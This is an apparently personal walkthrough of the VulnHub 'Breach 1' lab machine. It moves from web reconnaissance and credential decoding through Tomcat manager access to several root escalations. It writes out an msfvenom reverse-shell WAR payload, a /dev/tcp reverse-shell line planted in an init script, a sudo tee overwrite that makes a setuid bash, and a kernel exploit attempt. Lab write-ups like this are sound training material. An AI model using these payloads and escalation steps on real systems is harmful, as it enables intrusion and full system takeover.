# Recon
## NMAP
-  All ports are open

## Ferox
```
┌──(root💀kali)-[~/vulnHub/Breach1]
└─# feroxbuster -u http://192.168.110.140 -w /usr/share/wordlists/dirb/common.txt -o /root/vulnHub/Breach1/192.168.110.140/scans/tcp80/ferox_common.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.110.140
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ /root/vulnHub/Breach1/192.168.110.140/scans/tcp80/ferox_common.txt
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403       10l       30w      291c http://192.168.110.140/.htpasswd
403       10l       30w      286c http://192.168.110.140/.hta
403       10l       30w      291c http://192.168.110.140/.htaccess
301        9l       28w      318c http://192.168.110.140/images
200       26l      147w     1098c http://192.168.110.140/index.html
403       10l       30w      293c http://192.168.110.140/images/.hta
403       10l       30w      298c http://192.168.110.140/images/.htpasswd
403       10l       30w      298c http://192.168.110.140/images/.htaccess
403       10l       30w      295c http://192.168.110.140/server-status
[####################] - 2s      9226/9226    0s      found:9       errors:1      
[####################] - 1s      4613/4613    3772/s  http://192.168.110.140
[####################] - 1s      4613/4613    3726/s  http://192.168.110.140/images
```
```
┌──(root💀kali)-[~/vulnHub/Breach1]
└─# feroxbuster -u http://192.168.110.140 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o /root/vulnHub/Breach1/192.168.110.140/scans/tcp80/ferox_common.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.110.140
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ /root/vulnHub/Breach1/192.168.110.140/scans/tcp80/ferox_common.txt
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301        9l       28w      318c http://192.168.110.140/images
403       10l       30w      295c http://192.168.110.140/server-status
[####################] - 1m    441090/441090  0s      found:2       errors:1      
[####################] - 1m    220545/220545  2914/s  http://192.168.110.140
[####################] - 1m    220545/220545  2921/s  http://192.168.110.140/images

```

# Initial Access
## Port 80 (HTTP)
1. Proceed to `192.168.110.140/index.html` & View page source
	![](images/Pasted%20image%2020220120004916.png)
	![](images/Pasted%20image%2020220120012040.png)
	- Encoded String
	- `initech.html`
1. Decode it 
	```
	┌──(root💀kali)-[~/vulnHub/Breach1/192.168.110.140/loot/http]
	└─# echo -n  Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo | base64 -d | base64 -d 
	pgibbons:damnitfeel$goodtobeagang$ta
	```
	- Encoded message is encoded by base64 twice.
	- pgibbons:`damnitfeel$goodtobeagang$ta` 
		- Store username in a wordlist.	
3. Click on the image, redirected to `initech.html`
	![](images/Pasted%20image%2020220120012218.png)
4. Proceed to each panel
	- Cake
		 ![](images/Pasted%20image%2020220120012555.png)
	- Stapler
		![](images/Pasted%20image%2020220120012534.png)
	- Employee Portal
		![](images/Pasted%20image%2020220120012635.png)
		- ImpressCMS
5. Proceed to `/images`
	![](images/Pasted%20image%2020220120053242.png)
6. Download all images (including the ones found in impresscms) & analyze for any hidden objects
	```
	┌──(root💀kali)-[~/vulnHub/Breach1/192.168.110.140/loot/http]
	└─# binwalk -eM *.jpg *.png
	Scan Time:     2022-01-20 01:24:04
	Target File:   /root/vulnHub/Breach1/192.168.110.140/loot/http/cake.jpg
	MD5 Checksum:  bb59d999148563cb822ff71d58d87bdf
	Signatures:    411

	DECIMAL       HEXADECIMAL     DESCRIPTION
	0             0x0             JPEG image data, JFIF standard 1.01


	Scan Time:     2022-01-20 01:24:04
	Target File:   /root/vulnHub/Breach1/192.168.110.140/loot/http/milton_beach.jpg
	MD5 Checksum:  762e138784121b3ff2dddfb4f6145939
	Signatures:    411

	DECIMAL       HEXADECIMAL     DESCRIPTION
	0             0x0             JPEG image data, JFIF standard 1.01
	30            0x1E            TIFF image data, little-endian offset of first image directory: 8


	Scan Time:     2022-01-20 01:24:04
	Target File:   /root/vulnHub/Breach1/192.168.110.140/loot/http/swingline.jpg
	MD5 Checksum:  eb83c9619447471f6ece6a2be223380a
	Signatures:    411

	DECIMAL       HEXADECIMAL     DESCRIPTION
	0             0x0             JPEG image data, JFIF standard 1.02
	412           0x19C           Copyright string: "Copyright (c) 1998 Hewlett-Packard Company"
	
	Scan Time:     2022-01-20 05:36:56
	Target File:   /root/vulnHub/Breach1/192.168.110.140/loot/http/bill.png
	MD5 Checksum:  4b21e4a356b0caa990bf030ad9245c35
	Signatures:    411

	DECIMAL       HEXADECIMAL     DESCRIPTION
	0             0x0             PNG image, 610 x 327, 8-bit/color RGBA, non-interlaced
	41            0x29            Zlib compressed data, compressed


	Scan Time:     2022-01-20 05:36:56
	Target File:   /root/vulnHub/Breach1/192.168.110.140/loot/http/_bill.png.extracted/29
	MD5 Checksum:  d41d8cd98f00b204e9800998ecf8427e
	Signatures:    411
	
	┌──(root💀kali)-[~/vulnHub/Breach1/192.168.110.140/loot/http]
	└─# exiftool *.jpg *.png | grep -i comment
	Comment                         : coffeestains

	```
	- `bill.png`: coffeestains
		- Usually a password
	- `_bill.png.extracted`, a false positive 
7. Managed to w/ pgibbons:`damnitfeel$goodtobeagang$ta`
	![](images/Pasted%20image%2020220120013437.png)
8. View inbox
	![](images/Pasted%20image%2020220120024709.png)
	- Posting sensitive content (Not useful)
		![](images/Pasted%20image%2020220120024649.png)
	- IDS/IPS system (Not useful)
		![](images/Pasted%20image%2020220120024751.png)
	- FWD: Thank you for purchase.... (Found something)
		![](images/Pasted%20image%2020220120024952.png)
		- `.keystore` file
		- `.keystore` contains SSL cert?
		- Able to decrypt SSL traffic if we have the cert.
9. Proceed to Content 
	![](images/Pasted%20image%2020220120025207.png)
9. Since we are unable to view the contents, search would work
	![](images/Pasted%20image%2020220120025249.png)
	- tried test, actually found something
10. View "SSL implementation test capture"
	![](images/Pasted%20image%2020220120025735.png)
	- tomcat is set for `alias, storepassword and keypassword`
	- `_SSL_test_phase1.pcap` file
11. FUZZ search
	```
	┌──(root💀kali)-[~/vulnHub/Breach1/192.168.110.140/exploit/impresscms]
	└─# ffuf -u "http://192.168.110.140/impresscms/search.php?query=FUZZ&action=results" -w /usr/share/wordlists/rockyou.txt  -fw 753,758,748

			/'___\  /'___\           /'___\       
		   /\ \__/ /\ \__/  __  __  /\ \__/       
		   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
			\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
			 \ \_\   \ \_\  \ \____/  \ \_\       
			  \/_/    \/_/   \/___/    \/_/       

		   v1.3.1 Kali Exclusive <3
	________________________________________________

	 :: Method           : GET
	 :: URL              : http://192.168.110.140/impresscms/search.php?query=FUZZ&action=results
	 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
	 :: Follow redirects : false
	 :: Calibration      : false
	 :: Timeout          : 10
	 :: Threads          : 40
	 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
	 :: Filter           : Response words: 753,758,748
	________________________________________________

	password                [Status: 200, Size: 15492, Words: 926, Lines: 234]
	michael                 [Status: 200, Size: 15488, Words: 926, Lines: 234]
	PASSWORD                [Status: 200, Size: 15490, Words: 926, Lines: 234]
	peter                   [Status: 200, Size: 15480, Words: 926, Lines: 234]
	fishing                 [Status: 200, Size: 15488, Words: 926, Lines: 234]
	Password                [Status: 200, Size: 15490, Words: 926, Lines: 234]
	MICHAEL                 [Status: 200, Size: 15486, Words: 926, Lines: 234]
	Michael                 [Status: 200, Size: 15488, Words: 926, Lines: 234]
	access                  [Status: 200, Size: 15484, Words: 926, Lines: 234]
	```
	- Found another post w/ `michael`
12. Search michael
	![](images/Pasted%20image%2020220120025528.png)
	- there could be more senstive items?


## Exporting SSL certificate/Key from Keystore
1. Did some research
	- Searched "How to extract ssl cert from keystore"
	- https://stackoverflow.com/questions/23087537/how-to-export-key-and-crt-from-keystore/23087752
		```
		# Executed it, output says execute the following command instead which is industry standard:
		keytool -exportcert -keystore [keystore] -alias [alias] -file [cert_file]
		
		# Industry standard command:
		keytool -importkeystore -srckeystore [keystore] -destkeystore [target-keystore] -deststoretype PKCS12
		```
2. Download `_SSL_test_phase1.pcap`
	```
	┌──(root💀kali)-[~/vulnHub/Breach1/192.168.110.140/loot/http]
	└─# wget http://192.168.110.140/impresscms/_SSL_test_phase1.pcap
	--2022-01-20 03:00:10--  http://192.168.110.140/impresscms/_SSL_test_phase1.pcap
	Connecting to 192.168.110.140:80... connected.
	HTTP request sent, awaiting response... 200 OK
	Length: 41412 (40K) [application/vnd.tcpdump.pcap]
	Saving to: ‘_SSL_test_phase1.pcap’
	_SSL_test_phase1.pcap         100%[==============================================>]  40.44K  --.-KB/s    in 0s      
	2022-01-20 03:00:10 (225 MB/s) - ‘_SSL_test_phase1.pcap’ saved [41412/41412]
	```
3. Download `.keystore`
	```
	┌──(root💀kali)-[~/vulnHub/Breach1/192.168.110.140/loot/http]
	└─# wget 192.168.110.140/.keystore -O keystore
	--2022-01-20 03:01:57--  http://192.168.110.140/.keystore
	Connecting to 192.168.110.140:80... connected.
	HTTP request sent, awaiting response... 200 OK
	Length: 2245 (2.2K)
	Saving to: ‘keystore’
	keystore                      100%[==============================================>]   2.19K  --.-KB/s    in 0s      
	2022-01-20 03:01:57 (352 MB/s) - ‘keystore’ saved [2245/2245]
	```
4. Export SSL Certificate from keystore
	```
	┌──(root💀kali)-[~/vulnHub/Breach1/192.168.110.140/loot/http]
	└─# keytool -importkeystore -srckeystore keystore -destkeystore ssl_cert -deststoretype PKCS12
	Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
	Importing keystore keystore to ssl_cert...
	Enter destination keystore password:  tomcat
	Re-enter new password: tomcat
	Enter source keystore password:  tomcat
	Entry for alias tomcat successfully imported.
	Import command completed:  1 entries successfully imported, 0 entries failed or cancelled
	```


## Decrypting & Analyzing SSL traffic 
1. Open pcap in wireshark
	```
	wireshark _SSL_test_phase1.pcap 
	```
2. Import key
	- Edit -> Preferences -> TLS/SSL -> RSA keys list -> Edit -> Add entry & fill in details
	![](images/Pasted%20image%2020220120031711.png)
3. Filter by SSL
4. Right-Click -> Follow HTTP Traffic
	![](images/Pasted%20image%2020220120033113.png)
	- Basic Authentication is used, meaning password is only base64 encoded
5. Decode
	```
	┌──(root💀kali)-[~/vulnHub/Breach1/192.168.110.140/loot/http]
	└─# echo -n dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC | base64 -d
	tomcat:Tt\5D8F(#!*u=G)4m7zB
	```
	- tomcat:`Tt\5D8F(#!*u=G)4m7zB`
6. RCE 
	![](images/Pasted%20image%2020220120033933.png)

## Port 8443 (HTTPS)
1. Proceed to `https://192.168.110.140:8443/cmd/cmd.jsp?cmd=id`
	![](images/Pasted%20image%2020220120034159.png)
	- RCE did not work
2.  Proceed to `https://192.168.110.140:8443/_M@nag3Me/html` 
	![](images/Pasted%20image%2020220120033837.png)
3.  Login w/ tomcat:`Tt\5D8F(#!*u=G)4m7zB`
	![](images/Pasted%20image%2020220120034027.png)
4. Create reverse shell WAR file
	```
	┌──(root💀kali)-[~/vulnHub/Breach1/192.168.110.140/exploit/tomcat]
	└─# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.110.102 LPORT=4444 -f war -o rev64.war
	[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
	[-] No arch selected, selecting arch: x64 from the payload
	No encoder specified, outputting raw payload
	Payload size: 74 bytes
	Final size of war file: 1568 bytes
	Saved as: rev64.war
	```
5. Determine `.jsp` file
	```
	┌──(root💀kali)-[~/vulnHub/Breach1/192.168.110.140/exploit/tomcat]
	└─# jar -xvf rev64.war
	Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
	  created: META-INF/
	 inflated: META-INF/MANIFEST.MF
	  created: WEB-INF/
	 inflated: WEB-INF/web.xml
	 inflated: odwzawzlkdcmzy.jsp
	```
6. Upload it
7. Start listener
8. Execute reverse shell at 
	```
	https://192.168.110.140:8443/rev64/odwzawzlkdcmzy.jsp
	```
	![](images/Pasted%20image%2020220120035445.png)
	
# Privilege Escalation 
## milton (Creds Found) 
1. Find mysql credentials under `/var/www`
	![](images/Pasted%20image%2020220120044951.png)
2. Obtain credentials impresscms database
	```
	mysql -u root
	SHOW databases;
	USE impresscms
	SELECT name, pass FROM i3062034b_users;
	```
	```
	ImpressCMS Admin:$23$5000$S4mancatNXCgGKpitGa5dTpN0uSo0iSIMPl3X5WdVXSEe8LILqDynHRa3R2OE5pPe-1c70c0c66700b42c4d1f2ec15638b6f5e0bbcbc03c50298ad79f765a33901709d825c9dbb98e703ea71af4bb826469fc0df5eb68e66e4192bf1651c6f06c060c  

	Peter Gibbons:$23$5000$eemraVuhMjb0muJ8eKaIfAjJuOQorYcJ3HT0TQWVZ3XIR34Suws6rYN6uSQsQOU-5d3e3c6d93b361ca051900d8cfaecbf13c0b96fa76f525683f3a54386e04c4a68594359d15e2599f718af54fcad9a1e85d438e84da1c5af51f1fc3e185ba68a0       

	Michael Bolton:$23$5000$zk0tDm60SfN2vX9CJ3WuCxT3JoiwOmj99VwU3ZfuYwmKSuzhOuSDCLeedS7yhvC2-cac27699650c034aa4114fe1df04cc14e70a7dd6812a5af482e3c73f00b31595aa332242a0b67b0f58df485186d6c8176cafe1365f55097adcf15b307060d3f0   
	```
	- The hash cannot be identifed
3. Obtain credentials from mysql database
	```
	use mysql;
	SHOW tables;
	SELECT * from user;
	SELECT User, Password FROM user;
	```
	```
	mysql> SELECT User, Password FROM user;
	+------------------+-------------------------------------------+
	| User             | Password                                  |
	+------------------+-------------------------------------------+
	| root             |                                           |
	| milton           | 6450d89bd3aff1d893b85d3ad65d2ec2          |
	| root             |                                           |
	| root             |                                           |
	| debian-sys-maint | *A9523939F1B2F3E72A4306C34F225ACF09590878 |
	+------------------+-------------------------------------------+
	```
4. Crack hash 
	![](images/Pasted%20image%2020220120050341.png)
	milton:thelaststraw
5. Switch user to milton
	```
	tomcat6@Breach:/var/www/5446$ su milton
	Password: thelaststraw
	milton@Breach:/var/www/5446$ 
	```

## blumbergh (Image Forensics from earlier)
1. Earlier, we found `bill.png` at `/images`
	- Inside contains a comment `coffeestains`
2. Switch user to blumbergh w/ blumbergh:coffeestains
	```
	milton@Breach:/home$ su blumbergh 
	Password: coffeestains
	blumbergh@Breach:/home$ 
	```

## Root (GTFO Bin)
1. Check for sudo access for blumbergh
	```
	blumbergh@Breach:/home$ sudo -l
	coffeestainsMatching Defaults entries for blumbergh on Breach:
		env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

	User blumbergh may run the following commands on Breach:
		(root) NOPASSWD: /usr/bin/tee /usr/share/cleanup/tidyup.sh
	blumbergh@Breach:/home$ 
	```
	- `tee` has a GTFO Binary entry
2. View contents of `tidyup.sh`
	```
	blumbergh@Breach:/home$ cat /usr/share/cleanup/tidyup.sh
	#!/bin/bash
	#Hacker Evasion Script 
	#Initech Cyber Consulting, LLC
	#Peter Gibbons and Michael Bolton - 2016
	#This script is set to run every 3 minutes as an additional defense measure against hackers.
	cd /var/lib/tomcat6/webapps && find swingline -mindepth 1 -maxdepth 10 | xargs rm -rf
	```
	- Likely a cronjob running as root
3. Overwrite `tidyup.sh` w/ reverse shell
	```
	blumbergh@Breach:/home$ printf '#!/bin/bash\n\ncp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash\n' | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh;
	```
4. Wait for cronjob to execute
	```
	/tmp/rootbash -p 
	```
	![](images/Pasted%20image%2020220120061230.png)
5. Flag
	![](images/Pasted%20image%2020220120061405.png)

## Root (Service) 
1. Service script is writable
	![](images/Pasted%20image%2020220120061500.png)
2. Overwrite `portly.sh`
	```
	printf '#!/bin/bash\n\n/bin/bash -i >& /dev/tcp/192.168.110.102/4444 0>&1\n' > /etc/init.d/portly.sh
	```
	![](images/Pasted%20image%2020220120062049.png)
3. Reboot 
	![](images/Pasted%20image%2020220120062215.png)

# Root (kernel exploit) - Did not work
1. Kernel version
	![](images/Pasted%20image%2020220120062258.png)
2. Find exploit 
	- https://github.com/offensive-security/exploitdb/blob/master/exploits/linux_x86-64/local/40871.c	
		```
		┌──(root💀kali)-[~/vulnHub/Breach1/192.168.110.140/exploit/kernel]
		└─# searchsploit 40871.c
		Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privilege Escalation 
		```
3. Exploit
	```
	mv 40871.c chocobo_root.c
	gcc chocobo_root.c -o chocobo_root -lpthread
	./chocobo_root
	```
	![](images/Pasted%20image%2020220120063759.png)
	- Failed

---
Tags: #tcp/80-http/cms/tomcat #image-forensic #linux-priv-esc/linux-creds-found 

---



	
	
	

